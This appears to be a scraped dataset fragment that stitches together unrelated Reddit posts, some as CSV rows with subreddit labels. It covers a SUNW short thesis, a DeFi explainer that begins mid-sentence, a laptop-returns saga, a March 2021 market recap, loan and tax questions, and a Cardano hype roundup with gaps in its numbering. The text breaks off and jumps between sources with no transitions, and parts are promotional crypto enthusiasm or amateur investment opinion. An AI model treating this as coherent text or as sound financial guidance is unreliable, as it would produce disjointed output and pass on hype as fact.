Credibility: I'm pretty sure I have more solar customers than Sunworks.

Disclosure: I own a few Sunworks puts that I just bought Friday (less than half a percent of my portfolio), and will likely be buying more if it continues to climb without justification.

TLDR: SUNW doesn't make a profit, hasn't made a profit in over a decade, and doesn't appear to have any unique software, hardware, or business model.

or “DeFi” is an independently operating financial system that does not rely on centralized financial intermediaries like banks, unions or insurance funds.

The users, with the use of smart contracts, have the ability to trade, invest, and transact peer to peer using crypto currencies.

This eliminates the middle man which in this case are the slow and costly intermediaries.

DeFi is a complex financial use case of blockchain, helping in taking the right step towards mainstream adoption of crypto and blockchain technology. Other such cases include flash loans, derivatives, yield farming and lending.

# Why DeFi?

Centralized financial systems are slow, costly and vulnerable to data hacks, breaches and security issues. To make understanding the concept of DeFi simpler, think of a scenario where your bank makes a bad investment, or increases its fees. It ends up with the customer losing out.

In DeFi, the products, applications, and services, as well as the assets they service, are decentralized and therefore free from these points of failure found in centralized financial systems.

# Advantages of DeFi

Users have the flexibility to trade and transact with nothing but an internet connection, eliminating any scope of discrimination taking place

Instant and fast transfers along with reduced fees and charges are the most immediate benefits a user can observe while using DeFi. There are none to minimal intermediaries, reducing the need of paying the said intermediaries using fees.

DeFi lending protocols offer high interest rates for deposits along with low fees and favorable terms on loans and line of credit

DeFi offers equitable access to financial services to all and anyone with just an internet connection.

Yield farming allows investors to borrow and lend their crypto currencies at much higher rates than traditional banking and investments

This has been a thorough overview of what DeFi is, and how it is useful to the crypto community. I would like to make a follow up post on DeFi in detail

computers,My laptop story. Please help.,"Hi everyone, Im Federico and i would like to talk you about some complains about laptops that I have experienced.
I used to have a MacBook Pro 13 i5, 8Gb ram, 512ssd, but I sold it because it drives my nuts doing windows tasks with programs that aren’t in MacOS. Maybe I was a bit ramless, but can’t afford a 16gb ram mac. 

So, after sold it i had the chance to purchase a new laptop, so, I was really excited but a bit worried cause I didn’t know much about specs. Nevertheless, after studying about I bought a refurbished unit of Aero 15 X9, i7-8750h, RTX 2070 Max-q, 1tb ssd and 16 gb single channel memory. It worked fine, but in that moment I didn’t know much about undervolt and the laptop was absolutely toasty, furthermore the non dual channel was one of the worst experiences in Gaming I have ever try. Therefore, I was a bit disappointed about performance, also, battery life wasn’t the best. 

So I returned the Aero, and someone else bought it, missing the chance to bring it back. After that, I bought a Zephyrus g14 brand new (Ryzen 7 4800hs, 16gb ram, RTX 2060 max q, 1tb ssd). And i noticed that was incredible, so much battery life and amazing performance even with a 2060 max-q. But, after two or three weeks I noticed that the frame of the screen was off and sometimes it made sounds like “crack”. So I returned it too.

After that experience I regretted to buy gaming laptops, so I tried to purchase a Dell Xps 13 (i7-10510u, 16gb, 512 ssd). It was a bit expensive, but in that moment I was just focused on work. I must say that battery life was the best I have ever tested, about 12-15 hours being careless about adjustments. Nevertheless, after just 2 days, I was worried because the wifi and Bluetooth chip disconnects and connects randomly. And after a full reinstall of windows the problems persisted. Therefore I returned it back and purchase the same model again. In the second one, the laptop didn’t have that problem, but one of its keys felt off itself ! That keyboard made programming an impossible task with the { key broken. So I returned it too.

In this moment I thought that I was in a nightmare. I didn’t know much to do. So I bought a zenbook 14 ux425EA (i7-1165G7,16gb, 512ssd) and that laptop arrived with a defective battery, asus promising 24 hours battery and lasting 2 hours. For me, that I’m constantly going to university and staying there for more than 10 hours, it should a dealbreaker. So, as the others I returned it.

After that mess I ordered the Zephyrus g14 again, just the same as the time before, giving it a second chance as the dell. But during the shipment, a deal of the zephyrus g14 with a Ryzen 9, 32 gb ram, RTX 2060, and anime matrix appears. Therefore when the package arrived to my house I returned it immediately and I bought the Ryzen 9 version even without opening the box that come to my door. 

When the Ryzen 9 come to my house was the best, smooth as butter, and battery life was perfect too. But after three weeks the coat skin of the chassis started to pill off, so in this time I replaced the unit for a new one. When the second arrived ... had the same issue as the first, the screen frame gap and worst as the first, with more cracking and being absolutely fragile. So I gived up with asus and returned it too.

After that I spent two months without laptop, but one day my girlfriend told me that there was a msi gs66 with a good deal, i7-10875h, rtx 2060 Max-p, 32 gb ram. So, I ordered it , and it’s the one that I have by my side right know. Surely, the Monday I will return it because the speakers are horrible, the battery life one of the worst I tested in this lists, and the fans are constantly loud, even in the silent or super battery modes. 

Now, i don’t know what to do, surely it should be a good option to buy a RTX 3000 laptop. But it could be a productivity laptop, because I have a gaming desktop pc which I love. Please help me decide and avoid my traumas. It must be a Windows laptop.

We started off this week dealing with the fall out of a massive margin call that was executed in large part by [Goldman Sachs and Morgan Stanley](https://www.reuters.com/article/us-usa-markets-blocktrades/global-bank-losses-may-top-6-billion-on-archegos-downfall-idUSKBN2BK0OR) to cover losses incurred by Archegos Capital when their leveraged positions with Viacom ($VIAC) and Discovery ($DISCA) went haywire. Bill Hwang who runs Archegos Capital had been acquiring positions in both Viacom and Discovery through highly leveraged swaps. The straw that broke the camels back was a [$3 Billion dollar equity offering](https://markets.businessinsider.com/news/stocks/viacomcbs-stock-price-drop-3-billion-equity-offering-streaming-plans-2021-3-1030245725) by Viacom to fund their streaming business which caused a 29% decline in the stock price, which greatly affected the value of Archegos swaps. The losses proved to be too great for Goldman Sachs and Morgan Stanley’s personal risk tolerance as they demanded more collateral from Archegos to cover their losses. When Archegos was unable to do so, a $20 Billion dollar liquidation was initiated as multiple banks forced closed Archegos positions in block trades. (Block Trades are large trades negotiated between a buyer and seller, usually institutional, that is done off of the open market.) [Baidu, Tencent Muisc, Vipshop Holdings, Viacm, Discover, Farfetch, iQiyi, and GSX Techedu](https://finance.yahoo.com/news/goldman-sold-10-5-billion-155401799.html) all had positions closed and faced selling pressure as apart of the margin call.

Morgan Stanley shares fell 2.6%, Goldman Sachs dropped 1.7%, Deutsche Bank dropped 5%, UBS was down 3.8%, Creduit Suisse plummeted 14%, and Nomura suffered the worst with a 16.3% decline. Nomura warned in a statement that their loss may have been as large as $2 Billion dollars. There are rumors that one bank may have lost up to $4 Billion. 

**Suez Canal Re-Open for business**

After being stuck sideways for nearly a week, the Ever Given container ship, which stands larger than the entire state building, has been unstuck from the Suez Canal. It was reported that the ship got stuck due to [strong winds from a sand storm](https://www.usatoday.com/in-depth/graphics/2021/03/26/how-evergreens-ship-got-stuck-in-the-suez-canal/7010375002/). This resulted in many transport ships containing goods and materials becoming blocked as they were unable to travel to their destinations. It was initially believed that the dig-out effort could last weeks to get the ship unstuck causing many ships to detour around Africa to make it to their destination. It was estimated that [$400 Million dollars an hour](https://www.cnbc.com/2021/03/25/suez-canal-blockage-is-delaying-an-estimated-400-million-an-hour-in-goods.html?utm_term=Autofeed&amp;utm_medium=Social&amp;utm_content=Main&amp;utm_source=Twitter#Echobox=1616702338) in goods were being blocked from entering the canal.  

In the end, tug boats and dredgers prevailed and were able to free the ship from the banks which lead to the reopening of the canal. Shortly after the hashtag #Putitback started trending on twitter as some people seemingly wanted the boat to stay stuck for meme purposes. The unsticking of the boat had no immediate effect on the market as stocks remained mixed for the day. The S&amp;P 500 closed nearly unchanged, the Nasdaq closed down .6%, while the Dow Jones closed up .32% for a new record high.   

**Bond Yields**

Interest rates continue to creep up in the bond market. Early Tuesday in the trading day the 10 year [treasury yield hit a high of 1.77%](https://www.barrons.com/articles/u-s-stock-market-futures-mixed-as-10-year-treasury-yield-tops-1-77-51617098475). The spike comes after President Biden promised that by mid-April 90% of adults would be eligible to receive the covid Vaccine and that his administration is hoping to increase the pharmacies administrating vaccines from 17,000 to [40,000 sites](https://www.medpagetoday.com/infectiousdisease/covid19vaccine/91856) around the US. The rise in bond yields is currently attributed to the massive amounts of stimulus being spent in combination with vaccine effort leading America to what is sure to be one hell of a reopening. Godman Sachs forecasting that the US will see a rise in GDP growth of [nearly 7%](https://markets.businessinsider.com/news/stocks/economic-outlook-us-gdp-2021-forecast-coronavirus-stimulus-goldman-sachs-2021-2-1030059281#:~:text=to%20BI%20Prime-,Goldman%20Sachs%20boosts%20US%20GDP%20forecast%20to%206.8%25%20in%202021,trillion%20in%20COVID%2D19%20stimulus&amp;text=Goldman%20Sachs%20raised%20its%20forecast,to%206.8%25%20from%206.6%25.&amp;text=The%20bank%20moved%20up%20its,the%20first%20half%20of%202024.) throughout 2021.

**Build Back Better, US Infrastructure &amp; rising taxes.**  

On Wednesday Biden unveiled the details of his $2.3 trillion dollar infrastructure plan in Pittsburgh. [His plan would currently put $621 towards roads, bridges, public transit, and EV charging stations, $400 Billion towards care for the elderly, $213 retrofitting buildings and constructing affordable housing](https://www.wsj.com/articles/biden-set-to-unveil-2-trillion-infrastructure-plan-11617181208). Another $111 Billion would go to replace lead water pipes, $100 billion for broadband, and $100 billion towards upgrading the power grid to deliver clean energy. In additions the plan aims to build 500,000 EV charging stations, and invest in domestic semiconductor manufacturing. Delays in manufacturing due to semi-conductor shortages have become a hot topic as of late, and put pressure on the US to begin to manufacture semiconductors domestically rather than depend on China. 

The Build Back Better plan will be funded by raising corporate taxes from [21% to 28%](https://www.wtae.com/article/president-joe-biden-pittsburgh-visit/35924247). In 2017 President Trump had lowered the corporate tax rate from 35% to 21%. Although, it’s important to keep in mind that corporate taxes are just the first round of increased taxes that Biden is proposing. It is also expected that he will make a push to raise taxes on “high income” individuals and families, and also [raise capital gains](https://nypost.com/2021/03/31/where-the-money-is-coming-from-for-bidens-infrastructure-plan/) taxes for those who trade in the stock market. Although the income and spending of the higher taxes would take place over the course of 10 years, if higher taxes are approved those would go into effect this year.

OPEC lowered their 2021 growth forecast by 300,000 barrels per day due to concerns about the recovery as parts of [Europe go back into lockdown](https://www.bbc.com/news/explainers-53640249). Germany and the Netherlands have extended their lockdown into April, and France announced this week they will be entering into another lockdown as their ICU hits a high of 5,000 patients. Many other parts of Europe will be having temporary lockdowns for Easter to prevent the people traveling and possibly spreading Covid. It’s easy to see how OPEC remains concerned about oil demand with the US largely being the only country seemingly getting a grip on the virus with their vaccine rollouts. 

OPEC is set to meet on Thursday to discuss their output policy. At their last meeting, Saudi Arabia added an additional 1 million barrel per day cut to their oil production which resulted in a temporary surge to the price of oil to the mid $60’s. Currently OPEC is curbing the output by over [7 million barrels per day](https://www.reuters.com/article/us-oil-opec-panel/opec-panel-lowers-oil-demand-growth-forecast-idUKKBN2BN0G2) to help keep the price of oil stable.

Update: OPEC agreed on Thursday to do gradual increases in oil production starting in May which lead to rally in the oil market, bringing the price per barrel up 3.5% to over [$61 per barrel.](https://www.marketwatch.com/investing/future/crude%20oil%20-%20electronic) 

**ISM PMI &amp; EOW market rally.** 

Manufacturing in March jumped to its [highest level in 37 years](https://www.cnbc.com/2021/04/01/ism-manufacturing-march-2021.html?&amp;amp;qsearchterm=manufacturing). The Institute of supply management announced on Thursday it’s manufacturing index number increased from 60.8 to 64.7 which is the highest level since December 1983. It’s a stunning rebound in manufacturing considering 1 year ago the index dropped to under 45 in April while the US and most of the globe were under the first Covid lockdown. Although a rising PMI number is a sign of economic expansion, it could also be a sign of rising inflation as trillions are being pumped into the economy to stimulate growth. 

[All major indices rallied to end the week](https://www.cnbc.com/2021/03/31/stock-market-futures-open-to-close-news.html). The S&amp;P 500 broke above 4,000 for the first time to end at an all time high, the Nasdaq continued its rally gaining 1.8%, and the Dow had modest gains to close up .5%. The market will be closed on Friday in observance of Good Friday, although the jobs report will still be released on schedule. First time [unemployment claims rose to 719K](https://www.cnbc.com/2021/03/31/stock-market-futures-open-to-close-news.html) in March higher than the expected 675K that were expected. Although with the economy heating up as indicated by the PMI number, it is believed this unexpected bump in unemployment will be temporary and continue to fall into the summer season. 

**Notable Earnings** 

[$LULU posted an earnings beat](https://www.investors.com/news/lululemon-earnings-q4-2020-lulu-stock/) with an EPS of $2.58 and revenue of $1.73 billion. Their net revenue increased 94%. Despite the earnings beat $LULU dropped in trading and ended the week at $301.07. $LULU’s shares price has dropped 18% since the beginning of the year. 

[$CHWY reported 4th quarter results that beat estimates](https://www.investors.com/news/technology/chewy-stock-fourth-quarter-earnings-revenue-chwy/) and reported an unexpected profit causing the stock to pop 7% in after hours trading. Their revenue was up 51% from a year and had a 43% increase in users. CHWY hit a high of $93 dollar per share, and ended the week reading at $82.71

[$MU also beat on earnings](https://finance.yahoo.com/news/micron-mu-surpasses-q2-earnings-211509951.html) posting $0.98 per share. In addition they posted revenue of $6.24 billion for the quarter also beating estimates. Their stock traded higher to end the week as they gave a bullish forecast for their future and raised their forecast for the second quarter. As the US struggles with a chip shortage that has been slowing production in multiple sectors, expectations will certainly be high moving forward.

personalfinance,"Need advice - pay cash, or take out a loan?","Ok so here is the back story - my husband and I just sold our prior home for $65,000 and that money is sitting in our savings account. 

We have a home now that we live in.  We still owe $85,000 on it.  It's a 15 year loan with a 3.75% interest rate.  We took out the loan in Oct 2019 for $135,000 but have been paying it down quickly and are on track to pay it off within 4-5 more years if nothing goes wrong. Monthly payment is $1132.00.

We are in the process of buying 20 acres of land for $34,000.  It would be a 10 year loan at 5% interest. Monthly payment is somewhere around $360.00. 

Here is our question - below are the options we are weighing. Any input is appreciated.  We just want to know what option would make the most sense.  What do you guys think?

 \- Option 1 - Pay cash for the land and have about $25,000 to put towards our house.  That would leave us with paid for land and a house loan of around $60,000, which we could probably pay off in 3\~ years. 

\- Option 2 - Take the $34,000 loan out on the land and put all of the $65,000 down on the house, leaving us with a $20,000 home loan left. 

Interest wise, as the loans sit unpaid, the home loan of course has more interest that would get paid.  If we made no more extra payments toward the home loan, we are looking at paying $14,105.08 in interest before it is paid off. If we put $25,000 towards it, we would pay $6316.35.  If we put $65,000 towards it we would be looking at $611.49 in interest before payoff. As for the land, as the loan sits, we would pay $9,275.00 in interest.  Obviously, if we paid cash for it, we wouldn't pay any interest.  The thing is though, we would never let either loan go on for it's loan term. If the house is almost paid for, we could probably scrape up enough money before the end of the year to pay it off entirely and then strictly focus on the land, knocking it out within 2-3 years. I just don't know if we should have two loans, or strictly one.

For reference, I am 25 and my husband is 28.  We make about $105k-110k total a year. Thank you in advance for any advice/input.",finance
stocks,"Not a bull, not a bear. How I see things right now.","*\[This was a response to another commenter that I felt like could generate some good discussion. As I will mention a couple of times below, I'm new to investing, so consider this me working through my ideas and please do not take it as financial advice or the absolute truth of things.\]*

So - I don't really love the bull case ""Omg new paradigm, low interest rates, never bet against the USA!"", nor the bear case (predicted 20 of the last 5 recessions). TBH to me it just seems like nobody can ever truly know... imperfect information and what not.

I'm totally new to investing, but I did get my degree in economics. The market is definitely running hot right now, but then again, we can kind of afford it at the moment with all the easy money - the Fed is printing money precisely so that markets are more liquid. This is expected. We're also not totally detached from the fundamentals like we were with the dot com bubble. I mean, MSFT at 32 P/E ratio makes sense taking into account future earnings. You could say it makes sense for most of the S+P.

The problem is that it has to stop at some point. I mean, future earnings could account for the kind of P/Es we have now, but when we start reaching into 40,50, 60... then you're really getting detached from any sort of fundamentals. The other thing to look at is how much leverage is being used. [Right now, it's a lot.](https://www.advisorperspectives.com/dshort/updates/2021/03/17/margin-debt-and-the-market-up-another-1-9-in-february-continues-record-trend)

But again, that's to be expected because borrowing is so cheap right now. This is what the Fed wants. The Fed wants people to borrow, spend, invest, etc. Keep the wheels of the economy spinning.

But everything has limits. At some point the Fed has to pump the brakes on this. They say that's what they will do. But as unemployment is still high and inflation is still below target, they're not there yet.

That raises a couple of questions for me:

1. Will they actually pump the brakes when its time? Or will they continue to keep interest rates low in order to monetize US debt? Low interest rates means it's easier for the US government to pay back its debt. In theory, the Fed is independent of the US government. I'm not much of a conspiracy theorist so I do believe the Fed will act independently to raise rates when the time is right. But it's still something we won't know for sure until they actually do it. And there's also a question of *when*. I'm worried that things get too far ahead of fundamentals... ie, the easy money becomes too easy and the Fed loses control of the ship before it is able to act.
2. When they do start pumping the brakes, how will the markets react? It was actually the Bank of Japan trying to slowly put out the speculation fire (by raising rates) that caused the Japan asset bubble to crash, leading to the Lost Decade. There's a real concern, IMO, that the markets cannot sustain these valuations without the Fed's support. As soon as the Fed steps in, people might fear the party is over, panic sets in, and we crash.

So, what am I doing given all this uncertainty? I'm going for a middle-ground solution. I've got about half of my portfolio in a target retirement fund (various index funds) that I've been adding to for a few years, and I've got the other half in individual stocks that are either good, reliable businesses or very defensive stocks. Some are mining stocks in the event of inflation. I'm also holding some dry powder as well as some inflation protected bonds as another place to dump money that isn't cash.

Basically I'm playing the middle ground. If things go well, I will be able to ride the momentum. Not as well as everybody who is 100% in VOO, or 100% in winning tech stocks if they do rally and continue to do so. But I'll still do decently.

If things go poorly, I'll lose more than someone who was 100% defensive or purely in cash, obviously. But I'll also do a whole lot better than anyone who was 100% VOO or 100% tech.

I'm new to investing so take all of this with a grain of salt. Do your own research. But I think my econ degree, plus all of the research I've been doing the past 2 months or so, has given me some level of understanding of how things tend to work. I think my plan is appropriate given the uncertainty right now as well as my risk tolerance (which is not too high).",finance
personalfinance,Income assistance/financial aid/loan options for 42yo going back to school,"Hello,

I am starting a 23 month Radiologic Technology program in July. It is a JRCERT accredited program. This particular school however is not Title 4 which means no federal financial aid or federal student loans. I would need to take out a private student loan through Meritize or a personal loan.

CryptoCurrency,I've helped 3 friends &amp; my Dad to buy Crypto this year. My Dad &amp; I grew closer because of it...,"Have you gotten any friends or family into crypto during this bull run? 

Over the course of the last 90 days I've been able to help 3 friends and my 65 year old father get into Bitcoin and Crypto.

It all started when I was at the gym in January and I was talking with my friends about investments. I brought up crypto and one of my friends start joking with me about Bitcoin.  

He thought it was crazy that 1 coin was worth $25000 at the time (in January). We debated...

I told him I had been hodling for 4 years and I believed in crypto because of centralized currencies, the Fed policies, and coming USD inflation. 

These friends are conservative &amp; normal family guys but they listened to my stories abour crypto gains while we were working out over a few weeks of time.

As time went on, they started asking me and then begging me to help them buy some bitcoin. 

So soon after, on a Saturday afternoon in early February,  I helped them set up an account on Gemini and Coinbase to buy their own crypto. 

I also helped them to buy their own hardware wallet and I showed them how to store their coins. 

Soon after, my friends' Dads told my Dad about it. 

Then, my 65 year old Dad strarts asking me about it.

Last week he started a new account on Gemini &amp; bought the dip last week. 

I showed him how to buy a hardware wallet also. 

He loves it now because he's been hearing me talking about it for years but he finally ""gets it"". 

My dad and I had some rocky moments discussing politics last year during covid. We are opposite personalities &amp; we like to debate. It got heated last year but....

It's pretty cool because the talks about crypto &amp; the house we are building together in Florida the last few months have brought us closer together now.

Its sort of weird how Bitcoin &amp; crypto has helped us bond a little more. 

My friends &amp; dad aren't selling yet so thats kind of cool too, they're hodling for now....",cryptocurrency

personalfinance,"First Time Home Buyer, VA Loan, How much do I want to put down as a Down Payment? I need your subjective perspective.","Loan amount: $275K

Savings balance: $96K

I keep hearing mixed advice. When I research online, all of the articles are the same, and they either recommend 20%, or 0% (or 5% with the same logic). I've heard that I could potentially end up ""over-leveraged"" if I do 0% down, and that my payments would be outrageous each month.

&amp;#x200B;

My loan officer recommends only 5% down because ""money is so cheap right now!"" He means the interest rate. I think I'm approved for 2.5% or so.

For me, the draw to a larger down payment would mean smaller monthly payments, and possibly the ability to invest more each month. The upside to a smaller down payment, is that I can keep all that money and invest a good portion of it now.

personalfinance,I way underpaid on my taxes this year it turns out,"So I’m looking for some advice to see if there is anything else I can do moving forward or anything I should be aware of. I want to make sure we avoid any potential penalties etc. 

Some background:
- in 2020 my wife and I made a combined 197,000 which includes 11k of unemployment for her. 
- looking back at the W2s we paid about 21k of federal tax. Basic tax bracket calculations say it should have been 29k. 
- also it turns out that because we were only partial year residents in DC we can’t file as Married Filing Jointly. I lived there 7 months and my wife 10 months. This is ending up putting us as underpaying in DC too. 
- next year we will make approx 225,000 combined. 
- My calculations show we’ll owe approximately $35k in federal taxes next year so I am immediately going to increase my wife’s contribution by another $250 per bi-weekly check. Combined with what I contribute per check that will add to about $35k. 

Is there anything else I should know or do? I was really taken aback when I heard from our accountant and saw what we’d owe.

Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed in the secondary market for Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

Be the king of the post-zoom call crypto banter! [https://iohk.io/en/blog/posts/2021/03/12/cardanos-extended-utxo-accounting-model-part-2/](https://iohk.io/en/blog/posts/2021/03/12/cardanos-extended-utxo-accounting-model-part-2/)
8. Commenter Report:  the “metamask of Cardano” speculated about previously in item 30 is the “Yoroi dApp connector”.  It’ll be rolled out “with Ergo first and Cardano once Plutus is released.” [https://github.com/Emurgo/yoroi-ergo-connector](https://github.com/Emurgo/yoroi-ergo-connector)
9. It looks like this Yoroi dApp Connector info has even been detailed by Sebastien and Rob on yt. Not sure if we can link directly to this video. But, here is the link to the link. Looks like the dApp Connector talk starts at 1:23:10.  [https://twitter.com/NicoArqueros/status/1353203943195734017](https://twitter.com/NicoArqueros/status/1353203943195734017)
10. The visionaries among us are already thinking about advanced NFT derivative instruments (some even created by AI) in our ecosystem. [https://twitter.com/NicoArqueros/status/1370150347113648132](https://twitter.com/NicoArqueros/status/1370150347113648132)
11. Today is staking rewards day for Epoch 253!  Let’s get those duckets!
12. Cardano is getting a disproportionate cut of the attention market compared to its CMC neighbors. [https://twitter.com/CardanoRise/status/1371431289895665665](https://twitter.com/CardanoRise/status/1371431289895665665)
13. “Ask the Doctor” is switching from ERC-20 to Cardano. Note that Ask the Doctor is linked to FD7 Ventures in Item 7 below. [https://www.businesswire.com/news/home/20210315005744/en/Global-Healthcare-Platform-Ask-The-Doctor-to-Use-Cardano-for-World](https://www.businesswire.com/news/home/20210315005744/en/Global-Healthcare-Platform-Ask-The-Doctor-to-Use-Cardano-for-World)
14. We get another People of Input Output Global video.  This one features Dan Friedman. He currently lives in Japan.  But, the interview starts off with some very interesting stories about his youth in 1980s Kiev, Ukraine.  His speaking and story-telling style is similar to the captain in a 1990s buddy cop movie (in a good way). Very interesting and compelling guy.

18. The Coinbase News is allowing us to retire rumors 11, 17, and 41 above.
19. Today is Coinbase day! Finally!  Rejoice.  Trading on Coinbase Pro is supposed to open at or after 9am Pacific!

21. Perceptions are shifting on which platform will be #1 for smart contracts over the next decade. Here’s the biggest crypto youtuber asking his co-host if he’s losing faith in the traditional #1. If you’re in Cardano, you can guess which coin his answer is shifting away from. [https://youtu.be/4jRCmdWva40?t=3270](https://youtu.be/4jRCmdWva40?t=3270)
22. Even septuagenarians are getting in on Cardano. [https://twitter.com/Emini\_Scalper/status/1371061383975030787](https://twitter.com/Emini_Scalper/status/1371061383975030787)
23. Coinbase Pro did actually happen yesterday morning. Congratulations everyone. It’s been a long road and it was beautiful watching those initial candles build on the chart after all these years. [https://pro.coinbase.com/](https://pro.coinbase.com/)
24. The Crypto Time Traveler mentioned last week (Item 49) has apparently left us and now gone back to the future. It definitely adds a touch of realism when they actually leave. [https://twitter.com/CryptoTimeTrav2/status/1371492636884865029](https://twitter.com/CryptoTimeTrav2/status/1371492636884865029)
25. Charles delivered his pre-recorded keynote address at the Blockchain Africa Conference. His remarks support the rumor that the initial Ethiopia project will be around identity. He specifically mentioned Atala Prism. There was talk of the digital identity being able to be linked to wallets, payment systems, and property. He also reasserted that the deals on the table in Africa would bring “millions of users” into the Cardano ecosystem.  [https://www.youtube.com/watch?v=CGEs99I6qV8](https://www.youtube.com/watch?v=CGEs99I6qV8)
26. If you haven’t seen it in the past, the Atala Prism website has a demo that works with the mobile app showing how the identity solution (along with academic credentialing, health insurance, and proof of employment) would run on Cardano. [https://www.atalaprism.io/](https://www.atalaprism.io/)
27. ADA is now live on coinbase.com as well as Coinbase Pro! So, you don’t even need to understand orderbooks to buy ADA now. [https://blog.coinbase.com/cardano-ada-is-now-available-on-coinbase-dd30c1e0d93a](https://blog.coinbase.com/cardano-ada-is-now-available-on-coinbase-dd30c1e0d93a)

29. Never imagined there would be a holiday light display that flashed “Screw Doge Coin; ADA is Best” to the original Doge music. Friendly rivalry is probably good in crypto. [https://www.youtube.com/watch?v=eM135pv72mY&amp;t=31s](https://www.youtube.com/watch?v=eM135pv72mY&amp;t=31s)
30. Charles doubles down on the declaration that Cardano’s defining moment will be when it can provide the rails for micro finance from the developed world to the developing world not as a form of charity but as a profitable financial activity for both lender and loan recipient. He thinks it will be the biggest transfer of wealth in the history of the world. He says the base infrastructure for this is being rolled out over the next 24-36 months. [https://www.youtube.com/watch?v=oMRGUCLQPYo](https://www.youtube.com/watch?v=oMRGUCLQPYo)
31. The ADA adoption numbers are looking really good lately! [https://twitter.com/nierop\_pieter/status/1372686310901747712](https://twitter.com/nierop_pieter/status/1372686310901747712)
32. Max Keiser is also not romantically in love with us. Charles lays down the stick pretty hard on this one. I’m saying good. If you can’t take the heat...stay out of the Cardano kitchen, my man. [https://twitter.com/IOHK\_Charles/status/1373027224509542403](https://twitter.com/IOHK_Charles/status/1373027224509542403)
33. Cardano releases an infographic that sums up all the partnerships, deployments, startups, and functionality in the entire ecosystem.  We got a lot going on! [https://twitter.com/IOHK\_Charles/status/1373313974616215557](https://twitter.com/IOHK_Charles/status/1373313974616215557)
34. Here’s a really good article discussing decentralization in the context of Cardano core code maintenance. Really good job on this by [cardanians.io](https://cardanians.io/). [https://cardanojournal.com/who-will-maintain-cardano-129](https://cardanojournal.com/who-will-maintain-cardano-129)

40. Cardano 360 going down on Thursday March 25th.  This is the big monthly streaming event where they tell us what’s going on. Save your spot here:  [https://www.crowdcast.io/e/cardano360-march/register](https://www.crowdcast.io/e/cardano360-march/register)
41. Critics think that lack of burned fees is a valid complaint against Cardano. But, good outcomes at scale only come with good incentives and free competition. So, if the fees aren’t paying the costs of transactions in these other protocols, the question goes begging: who is? In the end, the answer always turns out to be that the transaction costs have just been obfuscated under the guise of inflation via coin emission or some other hidden tax on someone in the ecosystem (usually the coin holders).  [https://twitter.com/avaxholder/status/1373336728010956801](https://twitter.com/avaxholder/status/1373336728010956801)
42. We are starting to see cracks in the psychological armor of the Ethereum crowd.  This anti-Cardano post was at 0 upvotes (at time of writing) while the fairly pro-Cardano response received triple figure upvotes. [https://www.reddit.com/r/ethereum/comments/maktuy/ist\_charles\_hoskinson\_the\_new\_justin\_sun/](https://www.reddit.com/r/ethereum/comments/maktuy/ist_charles_hoskinson_the_new_justin_sun/)
43. When smart contracts go live with Alonzo (the final HFC event in Goguen), and we eventually have Babel Fees, it’s going to make almost zero sense for any developer to choose ETH over Cardano. This will apply especially to any project that sends tokens to its customers (e.g. NFT projects) and any project that involves significant computation or transaction loads on the network (e.g. DeFi projects).
44. Emurgo is thinking about supply chain solutions for the seafood industry. [https://emurgo.io/blog/how-can-blockchain-deliver-benefits-to-the-seafood-industrys-supply-chain](https://emurgo.io/blog/how-can-blockchain-deliver-benefits-to-the-seafood-industrys-supply-chain)

47. A guy tried to use Charles’s reaction to the King Soopers tragedy in Boulder to criticize Cardano. Charles told him to go f\*\*\* himself and then auctioned off the tweet with proceeds going to the families of the victims. The auction price quickly hit four figures and closed at $7k.  [https://v.cent.co/tweet/1374207862646304773?s=u\_a](https://v.cent.co/tweet/1374207862646304773?s=u_a)
48. Thursday is Cardano 360 and Friday will be “Get ADA Day” as staking rewards for Epoch 255 close. Gonna be an action packed close to the week.  Enjoy!
49. Here was my favorite moonboi tweet of the last few days.  Old photo, but excellent captioning work here. [https://twitter.com/MaximilianXCIX/status/1373471841449304066](https://twitter.com/MaximilianXCIX/status/1373471841449304066)
50. Great new interview with Sebastien! In this one he explains a lot about the dApp Connector being built by Emurgo. As reported by a commenter in one of our earlier threads, it will work with Ergo first and then Cardano. A very interesting tidbit was Sebastien’s explanation of how the Emurgo dApp Connector will actually be safer than Metamask (which fills a similar role in the ETH ecosystem).  Very good info. Thanks to Sebastien and the Cardano Podcast! [https://youtu.be/Dkw7hvFP6dY](https://youtu.be/Dkw7hvFP6dY)
51. Today is Cardano 360 day!!!!  Watch it here at 10:30AM Pacific, 17:30 GMT, 18:30 CET.  This is the live monthly streaming show from IOHK.  Watch this one. Hopefully we’ll get a target date for Alonzo.  That’ll tell us when we get smart contracts. [https://www.youtube.com/watch?v=uQt7AjimaAg](https://www.youtube.com/watch?v=uQt7AjimaAg)
52. Looks like the Cardano 360 show may highlight how Cardano will not experience some of the shortcomings that leading blockchains have in the past (like the time that bitcoin accidentally issued 184 billion BTC in one block).  [https://twitter.com/IOHK\_Charles/status/1374783084881608706](https://twitter.com/IOHK_Charles/status/1374783084881608706)
53. Catalyst Fund 5 will have a $2MM total budget! Included will be a very interesting $50k Metadata challenge in Fund 5.  Metadata can be used to prove the existence of a certain document or event to third parties without necessarily revealing the data contained therein. This means you can do cool things on the blockchain without using smart contracts as in the prior New Balance anti-counterfeiting and Beefchain traceability Cardano projects.The winners of this challenge are actually going to be incubated and supported by the IOHK Metadata team! People waiting for Goguen and smart contracts are definitely sleeping on what can be done with metadata on Cardano today.

54. There is a Catalyst Dashboard available that gives you all the stats on the current projects in Cardano’s multi-million dollar decentralized innovation fund (the world’s biggest).

55. Charles says they are going to end up spending $15-30MM this year on research and they will hire 100-200 people. That’s an investment in the future of the ecosystem! [https://www.youtube.com/watch?v=bLwyFADws8w](https://www.youtube.com/watch?v=bLwyFADws8w)
56. Cardano 360 was yesterday! The big news first: it sounds like the Alonzo (smart contracts)  testnet will launch around end of April or early May. It’s looking like Alonzo HFC event will happen on main net late July or August. The stream was over three hours long. They covered so much! Now, let’s get to the other details revealed. [https://www.youtube.com/watch?v=ULBLgPgxtN8](https://www.youtube.com/watch?v=ULBLgPgxtN8)
57. Grigory Rosu from Runtime Verification gave a big rundown on the universality in programming languages that will be provided by K framework in Cardano.  He said he should have some kind of proof of concept around six months from now.
